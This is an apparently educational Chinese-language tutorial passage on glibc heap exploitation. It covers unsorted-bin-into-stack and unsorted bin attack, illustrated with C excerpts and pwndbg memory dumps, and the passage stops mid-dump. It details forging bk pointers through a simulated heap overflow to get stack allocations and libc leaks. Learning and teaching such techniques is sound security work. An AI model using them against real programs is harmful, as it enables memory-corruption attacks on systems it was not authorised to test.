### 0x12 unsorted_bin_into_stack
unsorted-bin-into-stack 通过改写 unsorted bin 里 chunk 的 bk 指针到任意地址，从而在栈上 malloc 出
chunk。
首先，我们得先malloc 一块 chunk，然后 free 掉，将他放到 unsorted bin里。再这之前，我们也得 malloc 一块
作为缓冲的chunk ，避免目标chunk free 掉后被放入到 topchunk里。
    9   intptr_t* victim = malloc(0x100);
       10
       11   fprintf(stderr, "Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n");
       12   intptr_t* p1 = malloc(0x100);
       13
       14   fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
       15   free(victim);
这个时候 victim 就被放入到了 unsortedbin里
    PwnLife> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x7ffff7dd1b58 (main_arena+88) —▸ 0x602000 ◂— 0x7ffff7dd1b58
    smallbins
    empty
    largebins
    empty
紧接着，我们在栈上 fake 一个chunk。
    19   stack_buffer[1] = 0x100 + 0x10;
       20   stack_buffer[3] = (intptr_t)stack_buffer;
    PwnLife> p stack_buffer
    $3 = {0x0, 0x110, 0x0, 0x7fffffffe3f0}
    PwnLife> p &stack_buffer
    $4 = (intptr_t (*)[4]) 0x7fffffffe3f0
让伪造的 chunk 的bk 指向自身。
然后我们假设，此时有一个 堆溢出漏洞，可以修改 victim chunk的内容。
    24   fprintf(stderr, "Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && system_mem\n");
       25   victim[-1] = 32;
       26   victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack
       27   //------------------------------------
我们通过 溢出漏洞修改 victim chunk 的bk，但此前，我们得 pass 一个check
    Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && system_mem
       25   victim[-1] = 32;
       26   victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack
之后，
    PwnLife> p victim
    $6 = (intptr_t *) 0x602010
    PwnLife> x/20gx victim
    0x602010:   0x00007ffff7dd1b58  0x00007fffffffe3f0
    0x602020:   0x0000000000000000  0x0000000000000000
    0x602030:   0x0000000000000000  0x0000000000000000
    0x602040:   0x0000000000000000  0x0000000000000000
    0x602050:   0x0000000000000000  0x0000000000000000
    0x602060:   0x0000000000000000  0x0000000000000000
    0x602070:   0x0000000000000000  0x0000000000000000
    0x602080:   0x0000000000000000  0x0000000000000000
    0x602090:   0x0000000000000000  0x0000000000000000
    0x6020a0:   0x0000000000000000  0x0000000000000000
    PwnLife> x/20gx victim-2
    0x602000:   0x0000000000000000  0x0000000000000020
    0x602010:   0x00007ffff7dd1b58  0x00007fffffffe3f0    fake chunk
    0x602020:   0x0000000000000000  0x0000000000000000
    0x602030:   0x0000000000000000  0x0000000000000000
    0x602040:   0x0000000000000000  0x0000000000000000
    0x602050:   0x0000000000000000  0x0000000000000000
    0x602060:   0x0000000000000000  0x0000000000000000
    0x602070:   0x0000000000000000  0x0000000000000000
    0x602080:   0x0000000000000000  0x0000000000000000
    0x602090:   0x0000000000000000  0x0000000000000000
    PwnLife> x/20gx 0x00007fffffffe3f0                  bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x7ffff7dd1b68 (main_arena+104) —▸ 0x602000 ◂— 0x7ffff7dd1b68
    smallbins
    0x20: 0x7ffff7dd1b68 (main_arena+104) —▸ 0x602000 ◂— 0x7ffff7dd1b68
    largebins
    empty
fake chunk 被取出，而 victim chunk 被从 unsorted bin 中取出来放到了 small bin 中。另外值得注意的是
fake chunk 的 fd 指针被修改了，这是 unsorted bin 的地址，通过它可以泄露 libc 地址，这正是下面 unsorted bin
attack 会讲到的。
    29   fprintf(stderr, "Now next malloc will return the region of our fake chunk: %p\n", &stack_buffer[2]);
       30   intptr_t* fake = malloc(0x100); // malloc a new chunk from fake chunk.
       31   fprintf(stderr, "malloc(0x100): %p\n", fake);
    PwnLife> x/20gx fake-2
    0x7fffffffe3f0: 0x0000000000000000  0x0000000000000110    0x7ffff7dd1b58
    0x7fffffffe410: 0x00007fffffffe500  0x29b3145efbaf1600
    0x7fffffffe420: 0x0000000000400860  0x00007ffff7a303f1
    0x7fffffffe430: 0x0000000000040000  0x00007fffffffe508
    0x7fffffffe440: 0x00000001f7b9a488  0x0000000000400686
    0x7fffffffe450: 0x0000000000000000  0x595c9e280b1d3a76
    0x7fffffffe460: 0x0000000000400590  0x00007fffffffe500
    0x7fffffffe470: 0x0000000000000000  0x0000000000000000
    0x7fffffffe480: 0xa6a36157d3bd3a76  0xa6a371ee1c8f3a76
### 0x13 unsorted_bin_attack
unsorted bin 攻击通常是为更进一步的攻击做准备的，我们知道 unsorted bin 是一个双向链表，在分配时会通过 unlink 操作将
chunk 从链表中移除，所以如果能够控制 unsorted bin chunk 的 bk 指针，就可以向任意位置写入一个指针。这里通过 unlink 将
libc 的信息写入到我们可控的内存中，从而导致信息泄漏，为进一步的攻击提供便利。
unlink 的对 unsorted bin 的操作是这样的：
    /* remove from unsorted list */
              unsorted_chunks (av)->bk = bck;
              bck->fd = unsorted_chunks (av);
首先，分配 两个 chunk，释放第一个 使其加入到 unstorted bin
    PwnLife> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x7ffff7dd1b58 (main_arena+88) —▸ 0x602000 ◂— 0x7ffff7dd1b58
    smallbins
    empty
    largebins
    empty
紧接着，我假设我们有堆溢出漏洞
    25   p[1]=(unsigned long)(&stack_var-2);
       26   fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
       27   fprintf(stderr, "And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n",(void*)p[1]);
去修改，可以让我们修改 chunk 1 的数据。然后我们将 chunk 1 的 bk 指针修改为指向目标地址 - 2，也就相当于是在目标地址处有一个
fake free chunk
    PwnLife> p p
    $1 = (unsigned long *) 0x602010
    PwnLife> x/20gx p
    0x602010:   0x00007ffff7dd1b58  0x00007ffff7dd1b58
    0x602020:   0x0000000000000000  0x0000000000000000
    0x602030:   0x0000000000000000  0x0000000000000000
    0x602040:   0x0000000000000000  0x0000000000000000
    0x602050:   0x0000000000000000  0x0000000000000000
    0x602060:   0x0000000000000000  0x0000000000000000
    0x602070:   0x0000000000000000  0x0000000000000000
    0x602080:   0x0000000000000000  0x0000000000000000
    0x602090:   0x0000000000000000  0x0000000000000000
    0x6020a0:   0x0000000000000000  0x0000000000000000
    PwnLife> x/20gx p[1]
    0x7ffff7dd1b58 : 0x00000000006023a0  0x0000000000000000
    0x7ffff7dd1b68 :    0x0000000000602000  0x0000000000602000
    0x7ffff7dd1b78 :    0x00007ffff7dd1b68  0x00007ffff7dd1b68
    0x7ffff7dd1b88 :    0x00007ffff7dd1b78  0x00007ffff7dd1b78
    0x7ffff7dd1b98 :    0x00007ffff7dd1b88  0x00007ffff7dd1b88
    0x7ffff7dd1ba8 :    0x00007ffff7dd1b98  0x00007ffff7dd1b98
    0x7ffff7dd1bb8 :    0x00007ffff7dd1ba8  0x00007ffff7dd1ba8
    0x7ffff7dd1bc8 :    0x00007ffff7dd1bb8  0x00007ffff7dd1bb8
    0x7ffff7dd1bd8 :    0x00007ffff7dd1bc8  0x00007ffff7dd1bc8
    0x7ffff7dd1be8 :    0x00007ffff7dd1bd8  0x00007ffff7dd1bd8
此时，chunk 1的 bk已经被修改
    PwnLife> heap
    0x602000 PREV_INUSE {
      prev_size = 0,
      size = 417,
      fd = 0x7ffff7dd1b58 ,
      bk = 0x7fffffffe3c8,